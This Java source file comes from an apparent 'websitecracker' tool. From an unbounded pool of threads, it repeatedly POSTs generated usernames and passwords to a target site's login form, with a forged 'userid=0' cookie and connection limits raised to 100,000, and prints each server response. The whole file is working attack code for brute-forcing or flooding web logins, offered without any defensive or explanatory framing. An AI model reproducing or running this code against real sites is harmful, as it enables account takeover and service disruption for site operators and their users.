package io.github.websitecracker;

import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.TreeSet;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.config.CookieSpecs;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.protocol.HttpClientContext;
import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;

public class ApacheHTTPClientWrapper extends ClientWrapper {
    PoolingHttpClientConnectionManager cm;
    CloseableHttpClient httpClient;
    HttpContext context;
    BasicCookieStore store;

    public ApacheHTTPClientWrapper(String target, String userAgent, String usernameField, String passwordField)
            throws MalformedURLException {
        super(target, userAgent, usernameField, passwordField);

        cm = new PoolingHttpClientConnectionManager();
        cm.setMaxTotal(100000);
        cm.setDefaultMaxPerRoute(100000);

        store = new BasicCookieStore();
        BasicClientCookie cookie0 = new BasicClientCookie("userid", "0");
        cookie0.setDomain(new URL(target).getHost());
        store.addCookie(cookie0);
        httpClient = HttpClients.custom().setConnectionManager(cm).setDefaultCookieStore(store)
                .setDefaultRequestConfig(RequestConfig.custom().setCookieSpec(CookieSpecs.IGNORE_COOKIES)
                        /*.setConnectionRequestTimeout(1).setConnectTimeout(1).setSocketTimeout(1)*/.build())
                .build();
        context = new BasicHttpContext();
        context.setAttribute(HttpClientContext.COOKIE_STORE, store);
    }

    @Override
    public void start() {
        System.out.println("Initalized.");
        Scanner in = new Scanner(System.in);
        while (true) {
            int n = in.nextInt();
            System.out.println("+" + n);
            for (int i = 1; i <= n; i++) {
                R run = new R(this);
                ExecutorService cachedThreadPool = new ThreadPoolExecutor(0, Integer.MAX_VALUE, Long.MAX_VALUE,
                        TimeUnit.SECONDS, new SynchronousQueue<Runnable>());

                cachedThreadPool.execute(() -> {
                    run.run();
                });
                // Thread.sleep(13 + r.nextInt(250));
            }
        }
        // httpClient.close();
    }

    public static class R implements Runnable {

        final ApacheHTTPClientWrapper w;

        public R(ApacheHTTPClientWrapper w) {
            this.w = w;
        }

        @Override
        public void run() {
            try {
                Field field = BasicCookieStore.class.getDeclaredField("cookies");
                field.setAccessible(true);
                @SuppressWarnings("unchecked")
                TreeSet<Cookie> cookies = (TreeSet<Cookie>) field.get(w.store);

                while (true) {
                    try {
                        ArrayList<NameValuePair> list = new ArrayList<>(2);
                        list.add(new BasicNameValuePair(w.unf, U.gU()));
                        list.add(new BasicNameValuePair(w.pwf, U.gP()));

                        HttpPost post = new HttpPost(w.t);
                        post.addHeader("Accept", "*/*");
                        post.addHeader("Connection", "close");
                        post.addHeader("User-Agent", w.ua);
                        post.addHeader("Cookie", "userid=0");
                        // cookies.
                        // synchronized (cookies) {
                        // for (Cookie c : cookies) {
                        // if (c.getName().equalsIgnoreCase("PHPSESSID")) {
                        // cookies.remove(c);
                        // break;
                        // }
                        // }
                        // }

                        post.setEntity(new UrlEncodedFormEntity(list));

                        HttpResponse response = w.httpClient.execute(post, w.context);

                        System.out.println(EntityUtils.toString(response.getEntity()));
                        // Thread.sleep(66 + U.r.nextInt(233));
                    } catch (Exception e) {
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

}
